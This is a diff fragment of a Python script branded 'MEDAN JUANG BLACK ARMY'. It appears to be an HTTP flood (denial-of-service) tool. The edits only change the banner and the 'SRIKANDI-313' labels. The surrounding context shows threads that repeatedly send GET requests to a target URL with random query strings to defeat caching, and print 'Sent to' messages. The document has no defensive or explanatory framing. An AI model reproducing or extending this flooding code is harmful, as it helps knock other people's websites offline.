@@ -21,7 +21,7 @@ else:
     os.system("clear")
 
 os.system("\033[33mhttps://github.com/abatatsa99/")
-print("\033[32m<<———————————————— MEDAN JUANG BLACK ARMY ————————————————>>\033[0m")
+print("\033[32m<<————————————————— MEDAN JUANG BLACK ARMY —————————————————>>\033[0m")
 time.sleep(5)
 print("Loading.......")
 
@@ -105,10 +105,10 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print(f"\033[31m[] \033[38;5;206mSRK-313  \033[38;5;21mSent to ••>   \033[34m[" +str(url)+ "]\033[0m")
-                print(f"\033[33m[] \033[32mSRK-313  \033[36mSent to ••>   \033[33m[" +str(url)+ "]\033[0m")
+                print(f"\033[31m[]  \033[38;5;206mSRIKANDI-313  \033[97mSent to ••>   \033[34m[" +str(url)+ "]\033[0m")
+                print(f"\033[33m[] \033[33mSRIKANDI-313  \033[96mSent to ••>   \033[97m[" +str(url)+ "]\033[0m")
             except requests.exceptions.ConnectionError:
-                print(f"\033[97m[] \033[102mSRK-313  \033[31mSent to ••>   \033[33m[" +str(url)+ "]\033[0m")
+                print(f"\033[97m[] \033[102mSRIKANDI-313  \033[31mSent to ••>   \033[33m[" +str(url)+ "]\033[0m")
 
                 pass
             except requests.exceptions.InvalidSchema:
